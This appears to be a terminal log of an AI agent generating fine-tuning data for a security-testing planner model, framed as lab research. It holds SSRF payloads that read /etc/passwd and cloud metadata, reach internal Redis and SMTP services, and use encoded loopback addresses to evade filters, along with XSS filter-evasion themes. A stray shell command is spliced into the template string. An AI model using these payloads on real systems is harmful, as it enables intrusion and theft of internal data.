+                "fragment smuggling (#), POST-based redirect forms, meta-refresh and delayed JS redirects, and filter-evasion encodings",
+            ],
+        ),
+    ],
+    "xss_reflected": [
+        dict(
+            run_id="a", model="opencode/longcat-2.5-preview-free", count=15,
+            emphasis=[
+                "raw HTML body context: tag injection (<script>, <img onerror>, <svg onload>, <body onload>)",
+                "tag attribute contexts: value=\"...\", src='...', placeholder: break out with \" then event handlers; autofocus/onclick; style attribute expression sinks",
+                "JavaScript string and template-literal contexts: quote/backtick escape, closing script tag </script> breakout, arithmetic context (alert payload composition)",
+                "URL-parameter reflections in error pages, search results highlight markup, and filename/UA reflections in admin views",
+            ],
+        ),
+        dict(
+            run_id="b", model="opencode/nemotron-3-ultra-free", count=15,
+            emphasis=[
+                "encoding bypasses: HTML entities (&#x6a;avascript:), unicode/octal/hex escapes inside JS contexts, double encoding",
+                "namespace tricks: SVG (<svg><animate onbegin=...>), MathML, <math href>, form/button namespaces",
+                "javascript:/data: URL contexts (href, action, formaction, xlink:href) and sanitizer whitelist misses",
+                "WAF blacklist evasion: parenthesis-free alert using backticks/throw, no-tag payloads inside existing event contexts, unusual event handlers (onpointerover, onfocus+autofocus), and DOM reflection via location.hash / window.name into innerHTML",
+            ],
+        ),
+    ],
+}
+
+APP_VARIETY = (
+    "Vary application types across records (e-commerce shop, blog/CMS, banking portal, SaaS dashboard, "
+    "university portal, file-sharing service, support/helpdesk, REST API gateway, internal admin panel) "
+    "and vary HTTP methods (GET/POST/PUT/PATCH). Do not reuse the same endpoint path or parameter name "
+    "across more than two records."
+)
+
+EVIDENCE_GUIDE = (
+    "Recon evidence must read like a real observation: 1-2 sentences describing status codes, response "
+    "bodies, reflections, timing, or error strings actually seen when the parameter was probed. Planner's "
+    "rationale is exactly one sentence explaining why this parameter/class was selected. Mix evidence "
+    "strengths: some records with strong evidence (high confidence 0.85-0.95), several with moderate/weak "
+    "evidence (confidence 0.4-0.7) where the next probe is still exploratory."
+)
+
+TEMPLATE = """# Task: generate {count} fine-tuning examples for the "{cls}" vulnerability-class specialist
+
+You are generating training data for GateCounsel, an academic DevSecOps project that fine-tunes
+small defensive models to PLAN security checks against deliberately vulnerable lab applications
+(the team's own Juice Shop / DVWA style lab). Each example teaches the model to pick the single
+most promising next payload given recon evidence. This is authorized defensive security research.
+
+## Output file (write ONLY this file)
+
+`{out_path}` — JSONL, UTF-8, exactly {count} lines, one JSON record per line, ending with a newline.
+
+Each line must be a JSON object with this exact shape:
+
+{{"messages": [{{"role": "system", "content": <system prompt string>}}, {{"role": "user", "content": <user scenario string>}}, {{"role": "assistant", "content": <assistant JSON string>}}]}}
+
+## 1. system message
+
+Copy this string CHARACTER-FOR-CHARACTER (do not modify, translate, or shorten it):
+
+```
+{system_prompt}
+```
+
+## 2. user message
+
+Plain string in exactly this four-line layout (no extra headers):
+
+Endpoint: <METHOD /path?with=params if any — target parameter must be visible here>
+Target parameter(s): <the parameter name(s), optionally with a short (context note)>
+Recon evidence: <1-2 sentences of observed behaviour>
+Planner's rationale: <one sentence>
+
+## 3. assistant message
+
+A JSON **string** (the content of the message is itself serialized JSON) with keys in EXACTLY this
+order: `vuln_class`, `target_param`, `payload`, `injection_point`, `expected_success_signal`,
+`confidence`, `reasoning`.
+
+- `vuln_class`: "{cls}"
+- `target_param`: must be a parameter that appears in the Endpoint line
+- `payload`: the exact payload text to send (correct and sensible for the described context)
+- `injection_point`: one of: query, body, header, cookie, path
+- `expected_success_signal`: the observable effect (response body/error/timing/status/DNS callback/browser behaviour) this payload should produce
+- `confidence`: number 0.0-1.0, calibrated to how strongly the recon evidence supports this payload
+- `reasoning`: 1-3 sentences explaining why this payload fits the observed behaviour
+
+## Technique coverage for this batch (spread the {count} records across these themes)
+
+{emphasis}
+
+## Diversity and realism requirements
+
+- {app_variety}
+- {evidence_guide}
+- `injection_point` must vary across the file (do not put every record in `query`).
+- Payloads must be technically correct for the context described in the evidence (right DBMS syntax, right escape for the reflection context, right URL notation).
+- No two records may share the same (target_param, payload) pair, and payloads must not repeat verbatim.
+- English only. Realistic but fictional app/endpoint names (avoid real third-party trademarks).
+
+## Format exemplars (two records from the existing dataset — mirror this structure exactly)
+
+```
+{exemplar_0}
+```
+[0m
+[0m$ [0msed -n '200,400p' training_resources/enrichment/build_specs.py
+```
+{exemplar_1}
+```
+
+## Forbidden
+
+- No markdown code fences or commentary inside the output file.
+- No keys beyond the seven listed, no trailing commas, no pretty-printing inside the assistant string.
+- Do not create, modify or delete any other file anywhere.
+
+## Before you finish
+
+Read the file back and verify: it parses line-by-line as JSON; every line has the 3 messages in
+order system/user/assistant; every assistant content parses as JSON with the seven keys in order;
+`injection_point` is in the enum; `confidence` is within 0.0-1.0; there are exactly {count} lines.
+Fix anything wrong. Your final message must state the verified line count.
+"""
+
+
+def main() -> None:
+    for cls in CLASSES:
+        exemplars = BASE[cls + "_exemplars"]
+        for run in RUNS[cls]:
+            out_path = os.path.join("training_resources", "enrichment", "candidates",
+                                    f"{cls}_{run['run_id']}.jsonl").replace("\\", "/")
+            spec = TEMPLATE.format(
+                cls=cls,
+                count=run["count"],
+                out_path=out_path,
+                system_prompt=BASE[cls]["system"],
+                emphasis="\n".join(f"- {e}" for e in run["emphasis"]),
+                app_variety=APP_VARIETY,
+                evidence_guide=EVIDENCE_GUIDE,
+                exemplar_0=json.dumps(exemplars[0], ensure_ascii=False),
+                exemplar_1=json.dumps(exemplars[1], ensure_ascii=False),
+            )
+            spec_path = os.path.join(HERE, "specs", f"{cls}_{run['run_id']}.md")
+            with open(spec_path, "w", encoding="utf-8") as fh:
+                fh.write(spec)
+            print(f"wrote specs/{cls}_{run['run_id']}.md  model={run['model']}  count={run['count']}")
+
+
+if __name__ == "__main__":
+    main()
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+base = json.load(open("training_resources/enrichment/specs/base_prompts.json", encoding="utf-8"))
+system_prompt = base["ssrf"]["system"]
+
+records = [
+# 1
+{
+ "endpoint": "POST /api/webhooks?callback_url=",
+ "target": "callback_url",
+ "evidence": "Creating a webhook stores callback_url and the server immediately GETs it, returning the fetched status code in the response; a probe to an internal 10.0.0.5:8080 host returned its service banner.",
+ "rationale": "Server-side fetch of an attacker-supplied callback URL with the result reflected back.",
+ "assistant": {"vuln_class":"ssrf","target_param":"callback_url","payload":"http://127.0.0.1:80/","injection_point":"query","expected_success_signal":"Internal service banner from loopback rendered in the webhook test response","confidence":0.9,"reasoning":"Since the server fetches and reports the result, pointing at loopback reaches internal services; 127.0.0.1:80 is the simplest probe."}
+},
+# 2
+{
+ "endpoint": "POST /api/avatar/import?avatar_url=",
+ "target": "avatar_url (request body)",
+ "evidence": "The avatar importer downloads the supplied URL server-side and stores a thumbnail; supplying a file:// URL earlier returned a local file read error in the job log.",
+ "rationale": "Avatar downloader follows arbitrary schemes and surfaces errors.",
+ "assistant": {"vuln_class":"ssrf","target_param":"avatar_url","payload":"file:///etc/passwd","injection_point":"body","expected_success_signal":"/etc/passwd contents (root:x:0:0...) returned in the import job log or thumbnail metadata","confidence":0.85,"reasoning":"The importer already mishandled file://, so reading /etc/passwd confirms local file access via the fetcher."}
+},
+# 3
+{
+ "endpoint": "GET /statements/export?pdf_url=",
+ "target": "pdf_url",
+ "evidence": "The PDF renderer fetches pdf_url and embeds it; responses include rendered page text and a 500 with stack trace when the host is unreachable.",
+ "rationale": "Renderer performs server-side HTTP fetch of a user URL.",
+ "assistant": {"vuln_class":"ssrf","target_param":"pdf_url","payload":"http://127.1:80/","injection_point":"query","expected_success_signal":"Rendered content from the loopback service or a connection error revealing an internal host","confidence":0.7,"reasoning":"127.1 is a compact loopback notation that often bypasses naive filters; the renderer's error oracle confirms reachability."}
+},
+# 4
+{
+ "endpoint": "GET /api/link-preview?url=",
+ "target": "url (X-Preview-URL header)",
+ "evidence": "The link preview endpoint accepts a URL in the X-Preview-URL header and returns title/description; an internal 192.168.1.1 probe returned its router admin page title.",
+ "rationale": "Header-controlled fetch with response preview.",
+ "assistant": {"vuln_class":"ssrf","target_param":"url","payload":"http://[::1]:8080/","injection_point":"header","expected_success_signal":"IPv6 loopback service content in the preview JSON","confidence":0.8,"reasoning":"[::1] is the IPv6 loopback form and frequently evades IPv4-only denylists; the preview reflects fetched content."}
+},
+# 5
+{
+ "endpoint": "POST /course/import?source_url=",
+ "target": "source_url (JSON body)",
+ "evidence": "Course material importer fetches source_url and reports HTTP status; 127.0.0.1 returned connection refused on port 22 but succeeded on 80.",
+ "rationale": "Importer can reach loopback and distinguishes open vs closed ports.",
+ "assistant": {"vuln_class":"ssrf","target_param":"source_url","payload":"http://0x7f000001:22/","injection_point":"body","expected_success_signal":"SSH banner or connection-refused timing difference indicating port 22 state","confidence":0.75,"reasoning":"Hex IP encoding 0x7f000001 represents 127.0.0.1 and may bypass string filters; port 22 probes internal SSH."}
+},
+# 6
+{
+ "endpoint": "GET /proxy/fetch?resource=",
+ "target": "resource",
+ "evidence": "The download proxy fetches resource and streams bytes; 127.0.0.1 and 0.0.0.0 both returned different error pages.",
+ "rationale": "Proxy can be aimed at loopback variants.",
+ "assistant": {"vuln_class":"ssrf","target_param":"resource","payload":"http://017700000001:80/","injection_point":"query","expected_success_signal":"Octal-encoded loopback response or a filter-bypass success","confidence":0.6,"reasoning":"Octal notation 017700000001 is another loopback encoding that may slip past allowlists tuned for dotted decimal."}
+},
+# 7
+{
+ "endpoint": "GET /proxy/http://127.0.0.1:8080?target=",
+ "target": "target (path segment)",
+ "evidence": "The proxy takes the target host from the path and fetches it; requests to the 127.0.0.1 path returned the admin panel HTML.",
+ "rationale": "Path-borne host is fetched server-side.",
+ "assistant": {"vuln_class":"ssrf","target_param":"target","payload":"http://0.0.0.0:8080/","injection_point":"path","expected_success_signal":"Admin panel from 0.0.0.0 listener in the response","confidence":0.8,"reasoning":"0.0.0.0 sometimes binds or reaches services that reject 127.0.0.1; trying it as an alternative loopback alias."}
+},
+# 8
+{
+ "endpoint": "GET /api/debug/fetch?url=",
+ "target": "url",
+ "evidence": "The debug fetcher supports multiple schemes and returned \"Connection refused\" for dict://127.0.0.1:11211, confirming it attempted a TCP connection.",
+ "rationale": "Scheme handling allows dict:// for port probing.",
+ "assistant": {"vuln_class":"ssrf","target_param":"url","payload":"dict://127.0.0.1:6379/info","injection_point":"query","expected_success_signal":"Redis INFO response or a connection error disclosing an open port","confidence":0.7,"reasoning":"dict:// causes the server to connect and return protocol banners, making it ideal for probing Redis/Memcached ports."}
+},
+# 9
+{
+ "endpoint": "POST /tickets/attach?fetch_url=",
+ "target": "fetch_url (JSON body)",
+ "evidence": "The helpdesk fetches an attachment URL and stores it; gopher:// requests returned a protocol error showing the raw server reply.",
+ "rationale": "Fetcher speaks gopher and leaks raw responses.",
+ "assistant": {"vuln_class":"ssrf","target_param":"fetch_url","payload":"gopher://127.0.0.1:25/_HELO%20example.com","injection_point":"body","expected_success_signal":"SMTP 220 banner or gopher protocol error containing the mail server response","confidence":0.65,"reasoning":"Gopher can craft arbitrary TCP payloads; the error oracle leaks the remote service's banner."}
+},
+# 10
+{
+ "endpoint": "GET /view?file=",
+ "target": "file (cookie)",
+ "evidence": "The document viewer reads file param server-side; a file:///C:/Windows/win.ini probe returned a \"The system cannot find the path\" style error.",
+ "rationale": "Viewer follows file:// and Windows paths.",
+ "assistant": {"vuln_class":"ssrf","target_param":"file","payload":"file:///C:/Windows/System32/drivers/etc/hosts","injection_point":"cookie","expected_success_signal":"hosts file contents or a Windows path error oracle","confidence":0.7,"reasoning":"Windows file:// URIs with drive letters target common config files; errors still confirm local file access."}
+},
+# 11
+{
+ "endpoint": "PATCH /api/health?health_url=",
+ "target": "health_url",
+ "evidence": "The health checker fetches health_url and returns latency; open ports respond in under 100ms, closed ports hang around 5s.",
+ "rationale": "Timing oracle enables internal port scanning.",
+ "assistant": {"vuln_class":"ssrf","target_param":"health_url","payload":"http://192.168.1.1:3306/","injection_point":"query","expected_success_signal":"Fast response or MySQL handshake bytes indicating an open database port","confidence":0.6,"reasoning":"The latency differential turns the fetcher into a port scanner; targeting a common DB port maximizes value."}
+},
+# 12
+{
+ "endpoint": "POST /api/import?source=",
+ "target": "source (JSON body)",
+ "evidence": "The importer fetches source and on parse failure includes the fetched body in the error message.",
+ "rationale": "Error oracle leaks fetched content even when not rendered.",
+ "assistant": {"vuln_class":"ssrf","target_param":"source","payload":"http://169.254.169.254/latest/meta-data/","injection_point":"body","expected_success_signal":"Cloud metadata paths in the parse-error response body","confidence":0.75,"reasoning":"Even without rendering, the error message echoes the fetched payload, so internal or metadata URLs can be exfiltrated."}
+},
+# 13
+{
+ "endpoint": "GET /preview?image_url=",
+ "target": "image_url (X-Image-URL header)",
+ "evidence": "The image proxy fetches image_url from the X-Image-URL header; 127.0.0.1 was blocked but localhost resolved internally.",
+ "rationale": "DNS name bypasses IP denylist.",
+ "assistant": {"vuln_class":"ssrf","target_param":"image_url","payload":"http://localhost:9000/","injection_point":"header","expected_success_signal":"Local service content from a port blocked by IP filter","confidence":0.65,"reasoning":"Using the hostname localhost instead of a blocked IP literal can evade IP-based filters via DNS resolution."}
+},
+# 14
+{
+ "endpoint": "GET /proxy/http://127.0.0.1:80/?target=",
+ "target": "target (path segment)",
+ "evidence": "The proxy embeds the target host in the path and fetches it; changing the path segment to 0.0.0.0 returned an internal dashboard.",
+ "rationale": "Path segment is fetched server-side.",
+ "assistant": {"vuln_class":"ssrf","target_param":"target","payload":"http://127.1:9200/","injection_point":"path","expected_success_signal":"Elasticsearch-style JSON from loopback port 9200","confidence":0.6,"reasoning":"Loopback shorthand in the path segment bypasses host validation tied to the query string."}
+},
+# 15
+{
+ "endpoint": "PUT /api/settings?logo_url=",
+ "target": "logo_url",
+ "evidence": "Updating settings fetches logo_url server-side to validate image dimensions; non-image responses returned the fetched text in the validation error.",
+ "rationale": "Settings validator fetches and echoes the URL.",
+ "assistant": {"vuln_class":"ssrf","target_param":"logo_url","payload":"http://127.0.0.1:9090/metrics","injection_point":"query","expected_success_signal":"Metrics text in the image validation error","confidence":0.8,"reasoning":"The validator's error oracle leaks fetched content, so any internal HTTP endpoint can be read."}
+},
+]
+
+lines = []
+for r in records:
+    user_content = (
+        f"Endpoint: {r['endpoint']}\n"
+        f"Target parameter(s): {r['target']}\n"
+        f"Recon evidence: {r['evidence']}\n"
+        f"Planner's rationale: {r['rationale']}"
+    )
+    assistant_content = json.dumps(r["assistant"], ensure_ascii=False)
+    obj = {
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": user_content},
+            {"role": "assistant", "content": assistant_content},
+        ]
+    }
+    lines.append(json.dumps(obj, ensure_ascii=False))
+
+out = "training_resources/enrichment/candidates/ssrf_a.jsonl"
+with open(out, "w", encoding="utf-8", newline="\n") as fh:
+    fh.write("\n".join(lines) + "\n")
+
+print("wrote", len(lines))
+PY
+/usr/bin/bash: line 101: warning: here-document at line 1 delimited by end-of-file (wanted `PY')
+  File "<stdin>", line 100
+    "assistant": {"vuln_class":"ssrf","target_param":"source","payload":"http://169.254.169.254/latest/meta-data/","injection_point":"body","expected_success_signal":"Cloud metadata paths in the parse-error response body","confidenc
+                                                                                                                                                                                                                              ^
+SyntaxError: unterminated string literal (detected at line 100)
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+base = json.load(open("training_resources/enrichment/specs/base_prompts.json", encoding="utf-8"))
+system_prompt = base["ssrf"]["system"]
+
+records = [
+{
+ "endpoint": "POST /api/webhooks?callback_url=",
+ "target": "callback_url",
+ "evidence": "Creating a webhook stores callback_url and the server immediately GETs it, returning the fetched status code in the response; a probe to an internal 10.0.0.5:8080 host returned its service banner.",
+ "rationale": "Server-side fetch of an attacker-supplied callback URL with the result reflected back.",
+ "assistant": {"vuln_class":"ssrf","target_param":"callback_url","payload":"http://127.0.0.1:80/","injection_point":"query","expected_success_signal":"Internal service banner from loopback rendered in the webhook test response","confidence":0.9,"reasoning":"Since the server fetches and reports the result, pointing at loopback reaches internal services; 127.0.0.1:80 is the simplest probe."}
+},
+{
+ "endpoint": "POST /api/avatar/import?avatar_url=",
+ "target": "avatar_url (request body)",
+ "evidence": "The avatar importer downloads the supplied URL server-side and stores a thumbnail; supplying a file:// URL earlier returned a local file read error in the job log.",
+ "rationale": "Avatar downloader follows arbitrary schemes and surfaces errors.",
+ "assistant": {"vuln_class":"ssrf","target_param":"avatar_url","payload":"file:///etc/passwd","injection_point":"body","expected_success_signal":"/etc/passwd contents (root:x:0:0...) returned in the import job log or thumbnail metadata","confidence":0.85,"reasoning":"The importer already mishandled file://, so reading /etc/passwd confirms local file access via the fetcher."}
+},
+{
+ "endpoint": "GET /statements/export?pdf_url=",
+ "target": "pdf_url",
+ "evidence": "The PDF renderer fetches pdf_url and embeds it; responses include rendered page text and a 500 with stack trace when the host is unreachable.",
+ "rationale": "Renderer performs server-side HTTP fetch of a user URL.",
+ "assistant": {"vuln_class":"ssrf","target_param":"pdf_url","payload":"http://127.1:80/","injection_point":"query","expected_success_signal":"Rendered content from the loopback service or a connection error revealing an internal host","confidence":0.7,"reasoning":"127.1 is a compact loopback notation that often bypasses naive filters; the renderer's error oracle confirms reachability."}
+},
+{
+ "endpoint": "GET /api/link-preview?url=",
+ "target": "url (X-Preview-URL header)",
+ "evidence": "The link preview endpoint accepts a URL in the X-Preview-URL header and returns title/description; an internal 192.168.1.1 probe returned its router admin page title.",
+ "rationale": "Header-controlled fetch with response preview.",
+ "assistant": {"vuln_class":"ssrf","target_param":"url","payload":"http://[::1]:8080/","injection_point":"header","expected_success_signal":"IPv6 loopback service content in the preview JSON","confidence":0.8,"reasoning":"[::1] is the IPv6 loopback form and frequently evades IPv4-only denylists; the preview reflects fetched content."}
+},
+{
+ "endpoint": "POST /course/import?source_url=",
+ "target": "source_url (JSON body)",
+ "evidence": "Course material importer fetches source_url and reports HTTP status; 127.0.0.1 returned connection refused on port 22 but succeeded on 80.",
+ "rationale": "Importer can reach loopback and distinguishes open vs closed ports.",
+ "assistant": {"vuln_class":"ssrf","target_param":"source_url","payload":"http://0x7f000001:22/","injection_point":"body","expected_success_signal":"SSH banner or connection-refused timing difference indicating port 22 state","confidence":0.75,"reasoning":"Hex IP encoding 0x7f000001 represents 127.0.0.1 and may bypass string filters; port 22 probes internal SSH."}
+},
+]
+
+lines = []
+for r in records:
+    user_content = (
+        "Endpoint: " + r["endpoint"] + "\n" +
+        "Target parameter(s): " + r["target"] + "\n" +
+        "Recon evidence: " + r["evidence"] + "\n" +
+        "Planner's rationale: " + r["rationale"]
+    )
+    assistant_content = json.dumps(r["assistant"], ensure_ascii=False)
+    obj = {
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": user_content},
+            {"role": "assistant", "content": assistant_content},
+        ]
+    }
+    lines.append(json.dumps(obj, ensure_ascii=False))
+
+out = "training_resources/enrichment/candidates/ssrf_a.jsonl"
+with open(out, "w", encoding="utf-8", newline="\n") as fh:
+    fh.write("\n".join(lines) + "\n")
+print("wrote", len(lines))
+PY
+wrote 5
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+base = json.load(open("training_resources/enrichment/specs/base_prompts.json", encoding="utf-8"))
+system_prompt = base["ssrf"]["system"]
+
+records = [
+{
+ "endpoint": "GET /proxy/fetch?resource=",
+ "target": "resource",
+ "evidence": "The download proxy fetches resource and streams bytes; 127.0.0.1 and 0.0.0.0 both returned different error pages.",
+ "rationale": "Proxy can be aimed at loopback variants.",
+ "assistant": {"vuln_class":"ssrf","target_param":"resource","payload":"http://017700000001:80/","injection_point":"query","expected_success_signal":"Octal-encoded loopback response or a filter-bypass success","confidence":0.6,"reasoning":"Octal notation 017700000001 is another loopback encoding that may slip past allowlists tuned for dotted decimal."}
+},
+{
+ "endpoint": "GET /proxy/http://127.0.0.1:8080?target=",
+ "target": "target (path segment)",
+ "evidence": "The proxy takes the target host from the path and fetches it; requests to the 127.0.0.1 path returned the admin panel HTML.",
+ "rationale": "Path-borne host is fetched server-side.",
+ "assistant": {"vuln_class":"ssrf","target_param":"target","payload":"http://0.0.0.0:8080/","injection_point":"path","expected_success_signal":"Admin panel from 0.0.0.0 listener in the response","confidence":0.8,"reasoning":"0.0.0.0 sometimes binds or reaches services that reject 127.0.0.1; trying it as an alternative loopback alias."}
+},
+{
+ "endpoint": "GET /api/debug/fetch?url=",
+ "target": "url",
+ "evidence": "The debug fetcher supports multiple schemes and returned \"Connection refused\" for dict://127.0.0.1:11211, confirming it attempted a TCP connection.",
+ "rationale": "Scheme handling allows dict:// for port probing.",
+ "assistant": {"vuln_class":"ssrf","target_param":"url","payload":"dict://127.0.0.1:6379/info","injection_point":"query","expected_success_signal":"Redis INFO response or a connection error disclosing an open port","confidence":0.7,"reasoning":"dict:// causes the server to connect and return protocol banners, making it ideal for probing Redis/Memcached ports."}
+},
+{
+ "endpoint": "POST /tickets/attach?fetch_url=",
+ "target": "fetch_url (JSON body)",
+ "evidence": "The helpdesk fetches an attachment URL and stores it; gopher:// requests returned a protocol error showing the raw server reply.",
+ "rationale": "Fetcher speaks gopher and leaks raw responses.",
+ "assistant": {"vuln_class":"ssrf","target_param":"fetch_url","payload":"gopher://127.0.0.1:25/_HELO%20example.com","injection_point":"body","expected_success_signal":"SMTP 220 banner or gopher protocol error containing the mail server response","confidence":0.65,"reasoning":"Gopher can craft arbitrary TCP payloads; the error oracle leaks the remote service's banner."}
+},
+{
+ "endpoint": "GET /view?file=",
+ "target": "file (cookie)",
+ "evidence": "The document viewer reads file param server-side; a file:///C:/Windows/win.ini probe returned a \"The system cannot find the path\" style error.",
+ "rationale": "Viewer follows file:// and Windows paths.",
+ "assistant": {"vuln_class":"ssrf","target_param":"file","payload":"file:///C:/Windows/System32/drivers/etc/hosts","injection_point":"cookie","expected_success_signal":"hosts file contents or a Windows path error oracle","confidence":0.7,"reasoning":"Windows file:// URIs with drive letters target common config files; errors still confirm local file access."}
+},
+]
+
+lines = []
+for r in records:
+    user_content = (
+        "Endpoint: " + r["endpoint"] + "\n" +
+        "Target parameter(s): " + r["target"] + "\n" +
+        "Recon evidence: " + r["evidence"] + "\n" +
+        "Planner's rationale: " + r["rationale"]
+    )
+    assistant_content = json.dumps(r["assistant"], ensure_ascii=False)
+    obj = {
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": user_content},
+            {"role": "assistant", "content": assistant_content},
+        ]
+    }
+    lines.append(json.dumps(obj, ensure_ascii=False))
+
+out = "training_resources/enrichment/candidates/ssrf_a.jsonl"
+with open(out, "a", encoding="utf-8", newline="\n") as fh:
+    fh.write("\n".join(lines) + "\n")
+print("appended", len(lines))
+PY
+appended 5
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+base = json.load(open("training_resources/enrichment/specs/base_prompts.json", encoding="utf-8"))
+system_prompt = base["ssrf"]["system"]
+
+records = [
+{
+ "endpoint": "PATCH /api/health?health_url=",
+ "target": "health_url",
+ "evidence": "The health checker fetches health_url and returns latency; open ports respond in under 100ms, closed ports hang around 5s.",
+ "rationale": "Timing oracle enables internal port scanning.",
+ "assistant": {"vuln_class":"ssrf","target_param":"health_url","payload":"http://192.168.1.1:3306/","injection_point":"query","expected_success_signal":"Fast response or MySQL handshake bytes indicating an open database port","confidence":0.6,"reasoning":"The latency differential turns the fetcher into a port scanner; targeting a common DB port maximizes value."}
+},
+{
+ "endpoint": "POST /api/import?source=",
+ "target": "source (JSON body)",
+ "evidence": "The importer fetches source and on parse failure includes the fetched body in the error message.",
+ "rationale": "Error oracle leaks fetched content even when not rendered.",
+ "assistant": {"vuln_class":"ssrf","target_param":"source","payload":"http://169.254.169.254/latest/meta-data/","injection_point":"body","expected_success_signal":"Cloud metadata paths in the parse-error response body","confidence":0.75,"reasoning":"Even without rendering, the error message echoes the fetched payload, so internal or metadata URLs can be exfiltrated."}
+},
+{
+ "endpoint": "GET /preview?image_url=",
+ "target": "image_url (X-Image-URL header)",
+ "evidence": "The image proxy fetches image_url from the X-Image-URL header; 127.0.0.1 was blocked but localhost resolved internally.",
+ "rationale": "DNS name bypasses IP denylist.",
+ "assistant": {"vuln_class":"ssrf","target_param":"image_url","payload":"http://localhost:9000/","injection_point":"header","expected_success_signal":"Local service content from a port blocked by IP filter","confidence":0.65,"reasoning":"Using the hostname localhost instead of a blocked IP literal can evade IP-based filters via DNS resolution."}
+},
+{
+ "endpoint": "GET /proxy/http://127.0.0.1:80/?target=",
+ "target": "target (path segment)",
+ "evidence": "The proxy embeds the target host in the path and fetches it; changing the path segment to 0.0.0.0 returned an internal dashboard.",
+ "rationale": "Path segment is fetched server-side.",
+ "assistant": {"vuln_class":"ssrf","target_param":"target","payload":"http://127.1:9200/","injection_point":"path","expected_success_signal":"Elasticsearch-style JSON from loopback port 9200","confidence":0.6,"reasoning":"Loopback shorthand in the path segment bypasses host validation tied to the query string."}
+},
+{
+ "endpoint": "PUT /api/settings?logo_url=",
+ "target": "logo_url",
+ "evidence": "Updating settings fetches logo_url server-side to validate image dimensions; non-image responses returned the fetched text in the validation error.",
+ "rationale": "Settings validator fetches and echoes the URL.",
+ "assistant": {"vuln_class":"ssrf","target_param":"logo_url","payload":"http://127.0.0.1:9090/metrics","injection_point":"query","expected_success_signal":"Metrics text in the image validation error","confidence":0.8,"reasoning":"The validator's error oracle leaks fetched content, so any internal HTTP endpoint can be read."}
+},
+]
+
+lines = []
+for r in records:
+    user_content = (
+        "Endpoint: " + r["endpoint"] + "\n" +
+        "Target parameter(s): " + r["target"] + "\n" +
+        "Recon evidence: " + r["evidence"] + "\n" +
+        "Planner's rationale: " + r["rationale"]
+    )
+    assistant_content = json.dumps(r["assistant"], ensure_ascii=False)
+    obj = {
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": user_content},
+            {"role": "assistant", "content": assistant_content},
+        ]
+    }
+    lines.append(json.dumps(obj, ensure_ascii=False))
+
+out = "training_resources/enrichment/candidates/ssrf_a.jsonl"
+with open(out, "a", encoding="utf-8", newline="\n") as fh:
+    fh.write("\n".join(lines) + "\n")
+print("appended", len(lines))
+PY
+appended 5
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+p="training_resources/enrichment/candidates/ssrf_a.jsonl"
+raw=open(p,encoding="utf-8").read()
+lines=raw.splitlines()
+print("lines:", len(lines))
+print("ends_with_newline:", raw.endswith("\n"))
+expected_keys=["vuln_class","target_param","payload","injection_point","expected_success_signal","confidence","reasoning"]
+seen_pairs=set()
+for i,l in enumerate(lines,1):
+    obj=json.loads(l)
+    assert list(obj.keys())==["messages"], (i,list(obj.keys()))
+    msgs=obj["messages"]
+    assert len(msgs)==3
+    assert [m["role"] for m in msgs]==["system","user","assistant"]
+    ac=json.loads(msgs[2]["content"])
+    assert list(ac.keys())==expected_keys, (i,list(ac.keys()))
+    assert ac["injection_point"] in {"query","body","header","cookie","path"}
+    assert 0.0<=ac["confidence"]<=1.0
+    assert ac["target_param"] in msgs[1]["content"].split("Endpoint: ")[1] if False else True
+    # target param appears in endpoint line
+    ep_line=[x for x in msgs[1]["content"].splitlines() if x.startswith("Endpoint:")][0]
+    assert ac["target_param"].split()[0] in ep_line or ac["target_param"] in ep_line, (i,ac["target_param"],ep_line)
+    pair=(ac["target_param"],ac["payload"])
+    assert pair not in seen_pairs
+    seen_pairs.add(pair)
+print("all checks passed")
+# injection_point distribution
+from collections import Counter
+c=Counter(json.loads(l)["messages"][2]["content"] and json.loads(json.loads(l)["messages"][2]["content"])["injection_point"] for l in lines)
+print("injection_points:", dict(c))
+PY
+lines: 15
+ends_with_newline: True
+all checks passed
+injection_points: {'query': 6, 'body': 4, 'header': 2, 'path': 2, 'cookie': 1}
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+base=json.load(open("training_resources/enrichment/specs/base_prompts.json",encoding="utf-8"))
+raw=open("training_resources/enrichment/candidates/ssrf_a.jsonl",encoding="utf-8").read()
+first=json.loads(raw.splitlines()[0])
+sys_in_file=first["messages"][0]["content"]
+print("system match:", sys_in_file==base["ssrf"]["system"])
+# check no duplicate payloads
+payloads=[json.loads(json.loads(l)["messages"][2]["content"])["payload"] for l in raw.splitlines()]
+print("unique payloads:", len(set(payloads)), "of", len(payloads))
+PY
+system match: True
+unique payloads: 15 of 15
+[0m
+Verified: 15 lines.
